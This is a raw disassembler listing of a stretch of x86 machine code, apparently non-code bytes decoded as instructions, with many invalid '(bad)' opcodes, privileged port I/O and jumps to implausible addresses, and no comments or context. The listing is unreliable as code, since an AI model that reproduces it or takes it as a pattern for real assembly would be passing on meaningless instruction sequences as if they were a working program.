  43259e:	in     eax,0xcf
  4325a0:	aas    
  4325a1:	out    dx,al
  4325a2:	mov    edx,0xa6894a18
  4325a7:	mov    ebp,0x58eb8eff
  4325ac:	out    0x3,eax
  4325ae:	bound  esp,QWORD PTR [edx-0x56]
  4325b1:	jg     0x4325ed
  4325b3:	push   eax
  4325b4:	inc    ebp
  4325b5:	(bad)  
  4325b6:	sbb    ebp,DWORD PTR [edx-0x3e83fc73]
  4325bc:	mov    ebp,0xfbbd9e8e
  4325c1:	jmp    0x4325b5
  4325c3:	and    cl,BYTE PTR [ecx]
  4325c5:	std    
  4325c6:	jmp    0x62477d2a
  4325cb:	fst    DWORD PTR [edi+0x64b33a69]
  4325d1:	push   eax
  4325d2:	ds jmp 0x17a3f4d7
  4325d8:	loop   0x43260a
  4325da:	add    BYTE PTR [ebp+0x62fcda55],bl
  4325e0:	fstp   DWORD PTR [esi-0x2a]
  4325e3:	test   DWORD PTR [ecx],eax
  4325e5:	pop    ds
  4325e6:	retf   0x17b8
  4325e9:	repnz mov ah,0xb2
  4325ec:	retf   
  4325ed:	mov    al,0x88
  4325ef:	xchg   ecx,eax
  4325f0:	cdq    
  4325f1:	test   al,0xe5
  4325f3:	push   edx
  4325f4:	add    edi,ebp
  4325f6:	leave  
  4325f7:	cwde   
  4325f8:	pop    ss
  4325f9:	repnz mov ah,0xa2
  4325fc:	retf   
  4325fd:	mov    al,0x8
  4325ff:	mov    al,ds:0xdd42bc63
  432604:	pop    edi
  432605:	add    DWORD PTR [edx],0x208fd962
  43260b:	pushf  
  43260c:	push   ss
  43260d:	jp     0x43261b
  43260f:	mov    bl,0x8
  432611:	add    BYTE PTR [edx+0x28d35d98],bh
  432617:	and    esp,edi
  432619:	sqrtps xmm6,XMMWORD PTR [edx+0x1f]
  43261d:	cli    
  43261e:	pop    esi
  43261f:	pop    esi
  432620:	dec    eax
  432621:	shl    dl,0x1f
  432624:	pop    edi
  432625:	add    DWORD PTR [ebx+0x60],0x1e7200d9
  43262c:	mov    cl,0x5a
  43262e:	pushf  
  43262f:	loop   0x43264e
  432631:	sub    BYTE PTR [ebx],ch
  432633:	pop    ebp
  432634:	(bad)  [ebp-0x69]
  432637:	mov    dh,0x53
  432639:	jmp    0x72:0x52d961e8
  432640:	sub    BYTE PTR [eax-0x14f94600],al
  432646:	mul    DWORD PTR fs:[ecx+0x3d8585d9]
  43264d:	cmc    
  43264e:	mov    bp,0xa78b
  432652:	mov    ebp,DWORD PTR [esi-0x5d74566b]
  432658:	gs pop esi
  43265a:	sub    eax,0xfa0593d1
  43265f:	(bad)  
  432661:	pop    eax
  432662:	(bad)  
  432663:	jmp    0x14c8ffc9
  432668:	sbb    ch,bl
  43266a:	inc    eax
  43266b:	jmp    0x53bffb56
  432670:	push   esi
  432671:	bound  eax,QWORD PTR [ecx+0xd95ea1]
  432677:	sbb    ebx,ebp
  432679:	xchg   esp,eax
  43267a:	sub    cl,0x61
  43267d:	fst    DWORD PTR [eax-0x62]
  432680:	mov    al,0x81
  432682:	(bad)  
  432683:	out    0x61,eax
  432685:	(bad)  [ebx+0xd99e66]
  43268b:	add    BYTE PTR [ebx+0xb8385aa],cl
  432691:	fld    QWORD PTR [eax]
  432693:	add    BYTE PTR [ebx+0x12],cl
  432696:	into   
  432697:	add    DWORD PTR [edi],0xfffffff5
  43269a:	div    DWORD PTR [edi+0xdeaf]
  4326a0:	mov    esi,0x3e45a
  4326a5:	cmp    ebx,edx
  4326a7:	push   eax
  4326a8:	(bad)  
  4326a9:	les    esi,FWORD PTR [ecx]
  4326ab:	stc    
  4326ac:	dec    DWORD PTR [ebx-0x56]
  4326af:	or     ebx,0xffffff93
  4326b2:	jnp    0x4326ae
  4326b4:	(bad)  
  4326b5:	cmp    edx,DWORD PTR [ebx]
  4326b7:	scas   eax,DWORD PTR es:[edi]
  4326b8:	or     BYTE PTR ds:0x848d00da,al
  4326be:	(bad)  
  4326c0:	(bad)  
  4326c1:	sti    
  4326c2:	test   eax,0xde738785
  4326c7:	add    BYTE PTR [eax],al
  4326c9:	mov    ebx,0x36e8c366
  4326ce:	fild   WORD PTR [eax]
  4326d0:	add    BYTE PTR [esi+0x5a],bh
  4326d3:	adc    al,0x6
  4326d5:	sti    
  4326d6:	fst    DWORD PTR [eax-0x75]
  4326d9:	add    BYTE PTR ds:0xd9cb0309,0x2b
  4326e0:	leave  
  4326e1:	add    DWORD PTR [ebx],edx
  4326e3:	test   DWORD PTR [eax],0x49e89cbb
  4326e9:	add    dl,BYTE PTR [eax]
  4326eb:	test   DWORD PTR [edi],0xc92b0a34
  4326f1:	loope  0x432705
  4326f3:	test   DWORD PTR [eax],0xe6b99cbb
  4326f9:	mov    ebx,0xbdc92e01
  4326fe:	adc    al,BYTE PTR [edi]
  432700:	mov    bh,0xbb
  432702:	out    0xbe,al
  432704:	mov    DWORD PTR [edx-0x7d],esp
  432707:	(bad)  
  432709:	add    BYTE PTR [ebp-0x1],bh
  43270c:	mov    DWORD PTR [ecx-0x2f7aa],eax
  432712:	or     eax,0x63e68289
  432717:	add    ch,bh
  432719:	pop    ecx
  43271a:	jmp    0x5f01815e
  43271f:	add    dl,BYTE PTR [edx+0x53]
  432722:	mov    ah,0x4b
  432724:	mov    bh,BYTE PTR [esi+edi*2+0x16]
  432728:	sub    ah,0x6e
  43272b:	ja     0x432721
  43272d:	data16 jbe 0x432768
  432730:	push   ebx
  432731:	mov    esp,DWORD PTR [esi+edi*8+0x3e958b4c]
  432738:	in     eax,0x5c
  43273a:	or     ebp,eax
  43273c:	test   BYTE PTR [ebp+0x1b8a3e9c],0xae
  432743:	or     al,0x3d
  432745:	add    bl,bl
  432747:	cmp    DWORD PTR [ecx+0x6b026200],0x10
  43274e:	out    0x84,eax
  432750:	jge    0x432752
  432752:	bound  eax,QWORD PTR [edx]
  432754:	dec    ebp
  432755:	mov    ebx,ebp
  432757:	mov    edx,0x7262fffd
  43275c:	test   ch,0x4a
  43275f:	add    dh,bh
  432761:	jmp    DWORD PTR [edx-0x7b]
  432764:	jle    0x4326f6
  432766:	bound  eax,QWORD PTR [edx]
  432768:	std    
  432769:	dec    edi
  43276a:	out    dx,eax
  43276b:	jnp    0x432749
  43276d:	add    BYTE PTR [eax],al
  43276f:	bound  eax,QWORD PTR [edx]
  432771:	dec    ebp
  432772:	stc    
  432773:	xchg   ecx,eax
  432774:	jg     0x432736
  432776:	sbb    bh,dl
  432778:	jl     0x43270c
  43277a:	call   FWORD PTR [ebp-0x49667dfe]
  432780:	fld1   
  432782:	add    esp,DWORD PTR [edx+0x1]
  432785:	ins    BYTE PTR es:[edi],dx
  432786:	jmp    0xea7a:0x275e1488
  43278d:	daa    
  43278e:	add    al,0x47
  432790:	and    ch,BYTE PTR [esp+eax*8-0x16]
  432794:	mov    esi,0x1465000f
  432799:	out    0x54,eax
  43279b:	mov    dl,0x66
  43279d:	popa   
  43279e:	xchg   esi,eax
  43279f:	push   ebp
  4327a0:	adc    al,0xe7
  4327a2:	push   ebx
  4327a3:	popf   
  4327a4:	stos   BYTE PTR es:[edi],al
  4327a5:	pop    edx
  4327a6:	iret   
  4327a7:	loope  0x4327c1
  4327a9:	ror    DWORD PTR [edi],1
  4327ab:	(bad)  
  4327ac:	and    al,cl
  4327ae:	cmp    ah,BYTE PTR [esi+0x67704198]
  4327b4:	(bad)  
  4327b5:	jecxz  0x4327b9
  4327b7:	(bad)  
  4327b8:	fnstenv [edi+edi*8+0x44db6283]
  4327bf:	fistp  WORD PTR [edx+0x51]
  4327c2:	add    esp,DWORD PTR [edx-0x27]
  4327c5:	jo     0x432748
  4327c7:	not    bh
  4327c9:	out    0x3,eax
  4327cb:	test   cl,ah
  4327cd:	pop    esp
  4327ce:	add    al,0xd9
  4327d1:	out    0x3,eax
  4327d3:	add    BYTE PTR [edx-0x181f9d9a],dl
  4327d9:	adc    esp,edi
  4327db:	push   ebx
  4327dc:	fucomi st,st(5)
  4327de:	mov    edx,DWORD PTR [ecx]
  4327e0:	and    bl,cl
  4327e2:	mov    di,0x665e
  4327e6:	imul   esi,DWORD PTR [ebp-0x7918ec3b],0x3e610db
  4327f0:	bound  eax,QWORD PTR [ecx]
  4327f2:	or     dl,ch
  4327f4:	test   al,0x13
  4327f6:	fs ret 
  4327f8:	sub    al,ch
  4327fa:	add    BYTE PTR [ecx+0x62],al
  4327fd:	adc    al,0xf9
  4327ff:	jmp    0x6fced132
  432804:	xlat   BYTE PTR ds:[ebx]
  432805:	adc    edi,ecx
  432807:	jmp    0x3a03ee3d
  43280c:	push   ss
  43280d:	adc    dl,bl
  43280f:	mov    eax,fs:0x98ba148e
  432815:	jbe    0x43284e
  432817:	sub    eax,0xe2740f1f
  43281c:	xchg   esp,eax
  43281d:	(bad)  
  43281f:	call   0xcf47b685
  432824:	fsub   st,st(5)
  432826:	cmp    eax,0xff1fe372
  43282b:	call   0xe1c48291
  432830:	arpl   cx,bx
  432832:	add    bl,dl
  432834:	pop    ecx
  432835:	pop    esi
  432836:	and    BYTE PTR [edi],0x0
  432839:	pusha  
  43283a:	fld    DWORD PTR [eax]
  43283c:	cdq    
  43283d:	in     al,0x58
  43283f:	add    bh,ah
  432841:	popa   
  432842:	fst    DWORD PTR [eax+0x26]
  432845:	pop    esp
  432846:	mov    ch,0x12
  432848:	test   eax,0xe5c49461
  43284d:	in     al,0x5f
  43284f:	into   
  432850:	call   0x66cf01b6
  432855:	pop    ebp
  432856:	xlat   BYTE PTR ds:[ebx]
  432857:	add    cl,ch
  432859:	stc    
  43285a:	dec    esp
  43285b:	jmp    0x432854
  43285d:	aad    0x56
  43285f:	shl    BYTE PTR [ecx+0x7d],0x81
  432863:	add    al,0xe8
  432865:	popa   
  432866:	(bad)  [ebp+0x39]
  432869:	fist   DWORD PTR [edi-0x32]
  43286c:	call   0x1a9401d2
  432871:	sahf   
  432872:	test   eax,0x28a40050
  432877:	jge    0x432839
  432879:	gs jmp 0xd470f1aa
  43287f:	dec    esp
  432880:	inc    ebx
  432881:	lds    ecx,FWORD PTR [ecx-0x2280c2fd]
  432887:	add    BYTE PTR [eax],al
  432889:	data16 fstp DWORD PTR [esi-0x77]
  43288d:	xchg   DWORD PTR [edi-0x231e797d],edx
  432893:	add    BYTE PTR [eax],al
  432895:	repnz xchg ecx,eax
  432897:	sbb    al,0x8
  432899:	jnp    0x432871
  43289b:	push   edi
  43289c:	pop    esi
  43289d:	add    BYTE PTR [esi-0x52],dh
  4328a0:	mov    edx,0x83a94b04
  4328a5:	in     al,dx
  4328a6:	mov    edx,0x3b010801
  4328ab:	(bad)  
  4328ac:	jnp    0x432853
  4328ae:	xchg   ebx,eax
  4328af:	or     esi,edi
  4328b1:	dec    DWORD PTR [ebx+0x61]
  4328b4:	jns    0x432846
  4328b6:	cmp    edx,esi
  4328b8:	add    BYTE PTR [eax-0x4a],dl
  4328bb:	pusha  
  4328bc:	clc    
  4328bd:	(bad)  
  4328be:	push   esp
  4328bf:	or     ch,al
  4328c1:	imul   edi,edi,0xc683f70b
  4328c7:	fld    DWORD PTR [eax]
  4328c9:	je     0x4328d5
  4328cb:	or     ebp,DWORD PTR [ebp+0xc]
  4328ce:	xchg   BYTE PTR [eax-0x8],ah
  4328d1:	(bad)  
  4328d2:	fs or  dh,bh
  4328d5:	jne    0x4328ca
  4328d7:	std    
  4328d8:	fadd   QWORD PTR ds:0xc2c10ae5
  4328de:	ret    
  4328df:	aad    0x4d
  4328e1:	mov    edx,edi
  4328e3:	push   esi
  4328e4:	in     al,0xf8
  4328e6:	cmp    bh,dl
  4328e8:	adc    eax,DWORD PTR [edi]
  4328ea:	mov    ebx,0x628b4ed5
  4328ef:	xor    DWORD PTR [eax+0x4107e8c],ecx
  4328f5:	add    BYTE PTR [edx+0x28],ah
  4328f8:	push   esp
  4328f9:	popa   
  4328fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4328fb:	push   edx
  4328fc:	jle    0x432962
  4328fe:	inc    esi
  4328ff:	clc    
  432900:	cld    
  432901:	mov    al,BYTE PTR [eax]
  432903:	(bad)  
  432905:	inc    edx
  432906:	add    esp,DWORD PTR [edx+0x0]
  432909:	dec    ebp
  43290a:	mov    edx,DWORD PTR [esi]
  43290c:	sbb    al,0x1
  43290e:	call   0xfa362d72
  432913:	or     dl,BYTE PTR [edx-0xd9dfffc]
  432919:	xchg   DWORD PTR [esi+edi*1+0x30],ecx
  43291d:	in     eax,0x9f
  43291f:	addr16 mov dl,dh
  432922:	pop    edx
  432923:	jmp    0xb200817d
  432928:	push   eax
  432929:	dec    edx
  43292a:	test   DWORD PTR [ebx-0x74],ecx
  43292d:	inc    ecx
  43292e:	and    al,0x52
  432930:	jne    0x4328dc
  432932:	mov    fs,WORD PTR [ebx+0x2]
  432935:	std    
  432936:	out    0xec,eax
  432938:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  432939:	repz stc 
  43293b:	ffreep st(2)
  43293d:	jne    0x432985
  43293f:	push   ecx
  432940:	jmp    0x432990
  432942:	dec    ebp
  432943:	mov    BYTE PTR [esi],ah
  432945:	dec    ebx
  432946:	push   eax
  432947:	or     eax,0xb124196f
  43294c:	push   ebx
  43294d:	repnz adc ebx,esi
  432950:	adc    al,0x3d
  432952:	add    bh,bl
  432954:	ret    0x2e73
  432957:	sub    dh,BYTE PTR [esi]
  432959:	sti    
  43295a:	clc    
  43295b:	outs   dx,BYTE PTR ds:[esi]
  43295c:	or     bh,BYTE PTR [esi-0x8]
  43295f:	jbe    0x4328e6
  432961:	sbb    cl,BYTE PTR [eax+0x866f876]
  432967:	add    ch,cl
  432969:	fstp   DWORD PTR [ebx+0x20]
  43296c:	push   0x5e
  43296e:	bound  ebx,QWORD PTR [esi+0x53e710bd]
  432974:	mov    ebx,0x220e2be6
  432979:	fldcw  WORD PTR [esi+0x40]
  43297c:	jle    0x432933
  43297e:	jo     0x4329fd
  432980:	enter  0xe7da,0x3
  432984:	pop    ss
  432985:	adc    eax,0x38db3db
  43298a:	in     eax,0x31
  43298c:	mov    ds:0xbc5939b0,al
  432991:	fucom  st(7)
  432993:	push   eax
  432994:	adc    BYTE PTR [eax-0x621804a2],ch
  43299a:	retf   
  43299b:	adc    ebx,ecx
  43299d:	dec    eax
  43299e:	xor    eax,0x7fd96203
  4329a3:	push   eax
  4329a4:	inc    esi
  4329a5:	punpckhdq mm7,QWORD PTR [edi+0x22]
  4329a9:	xchg   ecx,eax
  4329aa:	lods   eax,DWORD PTR ds:[esi]
  4329ab:	xor    BYTE PTR [edi],ch
  4329ad:	lods   al,BYTE PTR ds:[esi]
  4329ae:	mov    dh,0x69
  4329b0:	push   esi
  4329b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4329b2:	mov    bh,0xf4
  4329b4:	scas   al,BYTE PTR es:[edi]
  4329b5:	mov    ch,0x3
  4329b7:	push   ecx
  4329b8:	lahf   
  4329b9:	adc    ah,bl
  4329bb:	xchg   edi,eax
  4329bc:	push   esp
  4329bd:	cdq    
  4329be:	out    0x7e,eax
  4329c0:	and    cl,BYTE PTR [edi-0x2849c40b]
  4329c6:	sub    dh,BYTE PTR [eax+0x5a]
  4329c9:	pop    esp
  4329ca:	pop    ds
  4329cb:	adc    BYTE PTR [eax],al
  4329cd:	mov    DWORD PTR [eax-0x7c9fe791],edi
  4329d3:	fcomip st,st(4)
  4329d5:	outs   dx,BYTE PTR ds:[esi]
  4329d6:	mov    ch,0xef
  4329d8:	xchg   bl,ah
  4329da:	push   ss
  4329db:	call   0xfaec8be3
  4329e0:	push   cs
  4329e1:	ds out 0x0,eax
  4329e4:	test   eax,0xc5445661
  4329e9:	ins    DWORD PTR es:[edi],dx
  4329ea:	pop    eax
  4329eb:	xor    DWORD PTR [edi+0x6a00d960],0xe8b0dcfd
  4329f5:	retf   0x2f0e
  4329f8:	test   eax,0xab55b316
  4329fd:	pop    ebp
  4329fe:	(bad)  [ebp+0x17]
  432a01:	in     eax,0x3f
  432a03:	into   
  432a04:	call   0x1dc9036a
  432a09:	inc    edx
  432a0a:	fucomp st(0)
  432a0c:	xchg   esp,eax
  432a0d:	jp     0x432a21
  432a0f:	stc    
  432a10:	mov    eax,fs:0x9ada2690
  432a16:	popf   
  432a17:	dec    ebp
  432a18:	add    edx,DWORD PTR [edx-0x55]
  432a1b:	push   eax
  432a1c:	xchg   ch,dh
  432a1e:	mov    ah,0x20
  432a20:	sbb    dh,BYTE PTR [ebx+0x73551310]
  432a26:	cdq    
  432a27:	add    BYTE PTR [ecx+eiz*1-0x6c],ah
  432a2b:	push   cs
  432a2c:	and    DWORD PTR [edx+0xd5f9db],ebp
  432a32:	imul   ecx,DWORD PTR [eax+edi*8-0x77275303],0xff3f2fed
  432a3d:	push   ecx
  432a3e:	arpl   WORD PTR [edi+0x4fba9fc0],di
  432a44:	add    al,0xe9
  432a46:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  432a47:	push   esp
  432a48:	in     al,dx
  432a49:	push   0x2d
  432a4b:	adc    bh,BYTE PTR [edi+0x15]
  432a4e:	icebp  
  432a4f:	push   cs
  432a50:	stc    
  432a51:	jmp    0xb968003a
  432a56:	mov    DWORD PTR [edi],ecx
  432a58:	(bad)  
  432a59:	call   0x563abf
  432a5e:	pop    ds
  432a5f:	fld    QWORD PTR [eax+0x0]
  432a62:	aam    0x33
  432a64:	adc    eax,eax
  432a66:	or     esp,DWORD PTR [edx-0x23]
  432a69:	pop    ebp
  432a6a:	js     0x432a71
  432a6c:	sbb    eax,0x9ac6d4
  432a71:	push   esi
  432a72:	xor    BYTE PTR [edi+edi*4],al
  432a75:	push   es
  432a76:	cmp    eax,DWORD PTR [eax+0x40]
  432a79:	add    BYTE PTR [ebp+0x7774c8e0],dl
  432a7f:	aad    0xf9
  432a81:	je     0x432ae6
  432a83:	mov    dl,0xb7
  432a85:	jl     0x432ade
  432a87:	mov    eax,ds:0xf0bc5700
  432a8c:	dec    esp
  432a8d:	adc    bh,BYTE PTR [ebx]
  432a8f:	aad    0xee
  432a91:	add    eax,0x4491b3
  432a96:	add    BYTE PTR [edx+0x22e81291],cl
  432a9c:	or     dh,bh
  432a9e:	push   edi
  432aa0:	adc    al,0x74
  432aa2:	adc    ebx,ecx
  432aa4:	fmul   st,st(0)
  432aa6:	je     0x432a2f
  432aa8:	aad    0xf9
  432aaa:	mov    BYTE PTR [esi+0x4e],0x74
  432aae:	inc    esp
  432aaf:	cmp    esi,ecx
  432ab1:	adc    BYTE PTR [ebx+0x4b],al
  432ab4:	mov    bl,0xf7
  432ab6:	adc    eax,0x40e40b
  432abb:	cld    
  432abc:	mov    eax,DWORD PTR [esp+0x33]
  432ac0:	push   edi
  432ac1:	inc    esi
  432ac2:	add    al,0x5c
  432ac4:	push   esi
  432ac5:	pop    esi
  432ac6:	or     BYTE PTR [ebx],cl
  432ac8:	xchg   edx,eax
  432ac9:	ds or  al,0x81
  432acc:	mov    eax,ds:0xa3930c24
  432ad1:	add    eax,0xbaab458b
  432ad6:	or     BYTE PTR [edx+0x0],ah
  432ad9:	push   edi
  432ada:	test   ebx,esi
  432adc:	mov    dh,0x6
  432ade:	nop
  432adf:	mov    edi,0xbe7fd3f
  432ae4:	add    ebp,edi
  432ae6:	dec    esp
  432ae8:	cmp    esp,DWORD PTR [ecx]
  432aea:	or     BYTE PTR [ebx-0x7c],ah
  432aed:	push   es
  432aee:	test   DWORD PTR [edi+eiz*1+0x2ebdf847],edx
  432af5:	jp     0x432ab9
  432af7:	adc    al,0x42
  432af9:	add    DWORD PTR [eax],eax
  432afb:	add    BYTE PTR [edi],dl
  432afd:	jnp    0x432ad8
  432aff:	jg     0x432ab7
  432b01:	xchg   edi,eax
  432b02:	add    eax,DWORD PTR [eax]
  432b04:	(bad)  
  432b05:	out    0x79,al
  432b07:	out    dx,eax
  432b08:	sub    eax,0xc790073f
  432b0d:	mov    edi,0x485ff204
  432b12:	jno    0x432b58
  432b14:	bound  eax,QWORD PTR [ecx]
  432b16:	js     0x432b4a
  432b18:	mov    ch,0xe3
  432b1a:	js     0x432b60
  432b1c:	(bad)  
  432b1d:	(bad)  
  432b1e:	in     eax,dx
  432b1f:	adc    edx,DWORD PTR [esi]
  432b21:	xor    bh,BYTE PTR ds:0xb4f65400
  432b27:	je     0x432ac7
  432b29:	add    al,BYTE PTR [ebx+esi*2]
  432b2c:	push   0x45f9055a
  432b31:	je     0x432ab4
  432b33:	shl    BYTE PTR [esi+0x2a0b7d11],0x2f
  432b3a:	inc    ecx
  432b3b:	add    BYTE PTR [ebx-0x4d],ah
  432b3e:	or     ah,cl
  432b40:	scas   al,BYTE PTR es:[edi]
  432b41:	ds std 
  432b43:	adc    dh,BYTE PTR [edx+0x3f]
  432b46:	std    
  432b47:	push   eax
  432b48:	adc    eax,0xa20e3d2e
  432b4d:	add    bh,BYTE PTR [edx+0x7b]
  432b50:	pop    edx
  432b51:	fnstenv [esi-0x48f25e80]
  432b57:	and    cl,0x61
  432b5a:	adc    edx,esi
  432b5c:	jmp    0x432b07
  432b5e:	jg     0x432b67
  432b60:	add    BYTE PTR [edx-0x27],al
  432b63:	out    0x5b,eax
  432b65:	fisttp DWORD PTR [edi+eiz*8]
  432b68:	add    ecx,DWORD PTR [edi]
  432b6a:	xchg   al,ch
  432b6c:	add    esp,DWORD PTR [edx-0x5c]
  432b6f:	pusha  
  432b70:	push   eax
  432b71:	(bad)  
  432b72:	or     al,0xfc
  432b74:	or     edx,DWORD PTR [eax-0x67]
  432b77:	out    0x86,eax
  432b79:	mov    ds:0xd954f685,al
  432b7e:	push   esi
  432b7f:	pop    edi
  432b80:	repnz stos DWORD PTR es:[edi],eax
  432b82:	or     al,0x4d
  432b84:	add    al,0x32
  432b86:	or     al,0xd4
  432b88:	addr16 jo 0x432b24
  432b8b:	out    0x84,eax
  432b8d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  432b8e:	frstor [esi-0x51]
  432b91:	jle    0x432b9e
  432b93:	mov    ds:0x13b060f1,al
  432b98:	adc    eax,0xf28b4df7
  432b9d:	imul   ecx,DWORD PTR [eax+edi*8],0x0
  432ba1:	rcr    DWORD PTR [ecx],1
  432ba3:	cmp    DWORD PTR [esi+eax*4+0x694a6fd7],0xa0c9eb00
  432bae:	fsubp  st(0),st
  432bb0:	jl     0x432b8b
  432bb2:	and    al,0x61
  432bb4:	icebp  
  432bb5:	cmp    eax,DWORD PTR [ecx]
  432bb7:	inc    ecx
  432bb8:	add    esp,DWORD PTR [edx-0x27]
  432bbb:	pushw  0x5a
  432bbe:	fldenv [eax+0x72]
  432bc1:	pop    esi
  432bc2:	popa   
  432bc3:	test   eax,0x60ba00ff
  432bc8:	and    DWORD PTR [edx+0x1d],edx
  432bcb:	pop    ss
  432bcc:	add    ch,ch
  432bce:	popa   
  432bcf:	push   esi
  432bd0:	push   esp
  432bd1:	add    eax,0xed3e565a
  432bd6:	js     0x432ba4
  432bd8:	add    al,0x72
  432bda:	pushf  
  432bdb:	loope  0x432c5a
  432bdd:	mov    ds:0xa8871265,eax
  432be2:	jmp    0xe7386a3c
  432be7:	stos   BYTE PTR es:[edi],al
  432be8:	or     cl,ch
  432bea:	pop    ecx
  432beb:	int3   
  432bec:	or     al,0x63
  432bee:	and    al,0xe0
  432bf0:	mov    BYTE PTR [eax-0x6c1ab3c],ch
  432bf6:	cmp    ah,cl
  432bf8:	adc    BYTE PTR [ebx+0x6252d95d],ch
  432bfe:	mov    al,0x8d
  432c00:	jp     0x432be7
  432c02:	mov    dl,0x84
  432c04:	add    al,0x79
  432c06:	pusha  
  432c07:	scas   eax,DWORD PTR es:[edi]
  432c08:	mov    ebp,0xb96dbee
  432c0d:	push   ds
  432c0e:	dec    esi
  432c0f:	test   DWORD PTR [edx],ecx
  432c11:	and    DWORD PTR [edx],ecx
  432c13:	aad    0x2e
  432c15:	test   eax,0xeb66b39e
  432c1a:	daa    
  432c1b:	jae    0x432c2c
  432c1d:	and    BYTE PTR [esi+edi*4-0x32],0x2b
  432c22:	add    al,0xd7
  432c24:	xchg   BYTE PTR [edi],dh
  432c26:	bound  esi,QWORD PTR [eax+0x61000be8]
  432c2c:	fld    DWORD PTR [eax]
  432c2e:	push   ds
  432c2f:	mov    ah,0xa9
  432c31:	stc    
  432c32:	aam    0x15
  432c34:	out    0x40,eax
  432c36:	jmp    0x61c03eb1
  432c3b:	xor    dl,BYTE PTR [ebx+0x42]
  432c3e:	in     eax,dx
  432c3f:	bound  esp,QWORD PTR [esi-0x40]
  432c42:	scas   al,BYTE PTR es:[edi]
  432c43:	xchg   ebx,eax
  432c44:	dec    esp
  432c45:	push   edx
  432c46:	add    BYTE PTR [eax+0x137e7b07],dl
  432c4c:	xlat   BYTE PTR ds:[ebx]
  432c4d:	je     0x432c5b
  432c4f:	and    BYTE PTR [eax-0x4d40c4f0],0x8
  432c56:	movq   QWORD PTR [esi],mm2
  432c59:	jecxz  0x432c93
  432c5b:	lods   al,BYTE PTR ds:[esi]
  432c5c:	or     DWORD PTR ds:0x96ed14,ecx
  432c62:	mov    DWORD PTR [ebp+0x5fc07e0e],edi
  432c68:	rol    DWORD PTR [ebx+0x500a9f7c],0x50
  432c6f:	aam    0x91
  432c71:	add    al,0xff
  432c73:	scas   al,BYTE PTR es:[edi]
  432c74:	ror    BYTE PTR [esi],cl
  432c76:	inc    eax
  432c77:	retf   
  432c78:	popa   
  432c79:	shl    BYTE PTR [ebp-0x44],0x8d
  432c7d:	jbe    0x432c8f
  432c7f:	retf   
  432c80:	aam    0xe3
  432c82:	sete   BYTE PTR [ebx+0x6beff08]
  432c89:	or     eax,0x5e578b40
  432c8e:	or     BYTE PTR [eax],al
  432c90:	jnp    0x432c5a
  432c92:	rcr    BYTE PTR [edi+0x55],0x17
  432c96:	add    al,0x0
  432c98:	cmp    eax,0x5583e98e
  432c9d:	loope  0x432c96
  432c9f:	je     0x432d14
  432ca1:	mov    al,0xfa
  432ca3:	dec    BYTE PTR [ebp-0x1f]
  432ca6:	not    DWORD PTR ds:0x40effb
  432cac:	aam    0x83
  432cae:	add    al,0xff
  432cb0:	cs ret 0x400e
  432cb4:	cmp    edx,DWORD PTR [edi+0x46]
  432cb7:	add    al,0xc4
  432cb9:	push   esi
  432cba:	jbe    0x432cc4
  432cbc:	dec    ebx
  432cbd:	add    BYTE PTR ds:0xf52a62ff,0xf8
  432cc4:	dec    edi
  432cc5:	mov    al,0x17
  432cc7:	inc    eax
  432cc8:	bound  edi,QWORD PTR [edi+0x62]
  432ccb:	or     BYTE PTR [edx+0x6a],ah
  432cce:	mov    esi,0x7d93d953
  432cd3:	in     al,dx
  432cd4:	xchg   esi,eax
  432cd5:	bound  esi,QWORD PTR [esi-0x11]
  432cd8:	mov    BYTE PTR [ecx],al
  432cda:	jmp    0x57d0:0x17eb5e72
  432ce1:	inc    eax
  432ce2:	std    
  432ce3:	and    BYTE PTR [edx],0x64
  432ce6:	add    DWORD PTR [esi],ebp
  432ce8:	mov    ds:0x5c855ee6,al
  432ced:	sbb    ax,0x1f8b
  432cf1:	loopne 0x432d46
  432cf3:	test   DWORD PTR [eax],eax
  432cf5:	xchg   esp,eax
  432cf6:	cli    
  432cf7:	dec    esp
  432cf8:	add    al,0xe7
  432cfa:	aas    
  432cfb:	push   0xffffffe9
  432cfd:	cs mov ebp,0xc9e13e9
  432d03:	cmp    eax,0x21ef6700
  432d08:	add    BYTE PTR [edx-0x33],ah
  432d0b:	sar    cl,1
  432d0d:	paddb  mm7,QWORD PTR [edi+0x43]
  432d11:	(bad)  
  432d12:	xchg   edi,eax
  432d13:	adc    al,0x21
  432d15:	bound  eax,QWORD PTR [eax]
  432d17:	dec    ebp
  432d18:	inc    bx
  432d1a:	xchg   DWORD PTR [ebx-0x30d9d18],edi
  432d20:	jmp    edi
  432d22:	aas    
  432d23:	js     0x432ce2
  432d25:	ins    BYTE PTR es:[edi],dx
  432d26:	mov    ah,0xb8
  432d28:	and    dh,dl
  432d2a:	cmc    
  432d2b:	sub    eax,DWORD PTR [ebx+0x26]
  432d2e:	push   cs
  432d2f:	adc    al,0xf2
  432d31:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  432d32:	mov    BYTE PTR [esp+esi*2],0xc
  432d36:	je     0x432da8
  432d38:	mov    eax,0xb3dbd962
  432d3d:	cmp    ecx,DWORD PTR [edi+0x82fda9f]
  432d43:	fdivr  QWORD PTR [edi+0x1843ef2b]
  432d49:	mov    ds:0xd28f4ed9,al
  432d4e:	ficomp DWORD PTR [ecx-0x182e3344]
  432d54:	pop    eax
  432d55:	fcomip st,st(5)
  432d57:	fild   WORD PTR [bx+si]
  432d5a:	jp     0x432d36
  432d5c:	out    0x3,eax
  432d5e:	jmp    0xd9964901
  432d63:	pop    esi
  432d64:	pop    edi
  432d65:	in     eax,dx
  432d66:	jmp    0x432d70
  432d68:	mov    bh,0x5b
  432d6a:	mov    cx,0x3e7
  432d6e:	dec    edx
  432d6f:	or     dl,bh
  432d71:	add    ah,BYTE PTR [edx-0x56]
  432d74:	sub    cl,BYTE PTR [eax-0x3a]
  432d77:	(bad)  
  432d78:	call   0xfc4b8f80
  432d7d:	or     edx,DWORD PTR [eax-0x67]
  432d80:	out    0x86,eax
  432d82:	mov    ds:0xd978e48e,al
  432d87:	sub    eax,0xf19bedc9
  432d8c:	fadd   QWORD PTR [ebx]
  432d8e:	(bad)  
  432d8f:	fnstenv [eax-0x5fe6c33f]
  432d95:	rcr    DWORD PTR [ebx+0x4f],0xa8
  432d99:	cmp    al,0xf6
  432d9b:	shr    BYTE PTR [edi],cl
  432d9d:	js     0x432e16
  432d9f:	retf   
